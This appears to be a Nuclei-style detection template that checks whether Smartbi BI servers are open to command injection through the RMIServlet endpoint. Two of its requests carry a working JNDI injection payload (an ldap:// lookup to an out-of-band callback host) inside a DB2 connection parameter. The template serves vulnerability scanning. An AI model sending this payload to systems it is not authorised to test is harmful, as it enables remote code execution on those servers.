id: smartbi-command-injection
info:
  name: Smartbi BI Command Injection
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Detects potential command injection vulnerability in Smartbi BI via RMIServlet.
  reference:
    - https://www.smartbi.com.cn/patchinfo

variables:
  reverseDomain: '{{interactsh-url}}'

http:
  - id: r1
    method: POST
    path:
      - '{{BaseURL}}/smartbi/vision/RMIServlet'
    headers:
      Content-Type: application/x-www-form-urlencoded;charset=UTF-8
    body: |
      className=BIConfigService&methodName=testConnection&params=["DB2_V9","","localhost:6688",":clientRerouteServerListJNDIName=","admin","",{"dameng6":false,"secret-key":null,"secret-key-encrypt-type":"0","token-timeout":"60","require-password":"false"}]
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "stackTrace"
        part: body
      - type: word
        words:
          - "CLIENT_USER_NOT_LOGIN"
          - "会存在RCE的安全漏洞"
        part: body
        negative: true

  - id: r2
    method: POST
    path:
      - '{{BaseURL}}/smartbi/vision/RMIServlet'
    headers:
      Content-Type: application/x-www-form-urlencoded;charset=UTF-8
    body: |
      className=BIConfigService&methodName=testConnection&params=["DB2_V9","","localhost:6688","BLUDB:clientRerouteServerListJNDIName=ldap://{{reverseDomain}}:1389/#Exploit","admin","",{"dameng6":false,"secret-key":null,"secret-key-encrypt-type":"0","token-timeout":"60","require-password":"false"}]
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - dns

  - id: r3
    method: POST
    path:
      - '{{BaseURL}}/vision/RMIServlet'
    headers:
      Content-Type: application/x-www-form-urlencoded;charset=UTF-8
    body: |
      className=BIConfigService&methodName=testConnection&params=["DB2_V9","","localhost:6688",":clientRerouteServerListJNDIName=","admin","",{"dameng6":false,"secret-key":null,"secret-key-encrypt-type":"0","token-timeout":"60","require-password":"false"}]
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "stackTrace"
        part: body
      - type: word
        words:
          - "CLIENT_USER_NOT_LOGIN"
          - "会存在RCE的安全漏洞"
        part: body
        negative: true

  - id: r4
    method: POST
    path:
      - '{{BaseURL}}/vision/RMIServlet'
    headers:
      Content-Type: application/x-www-form-urlencoded;charset=UTF-8
    body: |
      className=BIConfigService&methodName=testConnection&params=["DB2_V9","","localhost:6688","BLUDB:clientRerouteServerListJNDIName=ldap://{{reverseDomain}}:1389/#Exploit","admin","",{"dameng6":false,"secret-key":null,"secret-key-encrypt-type":"0","token-timeout":"60","require-password":"false"}]
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - dns
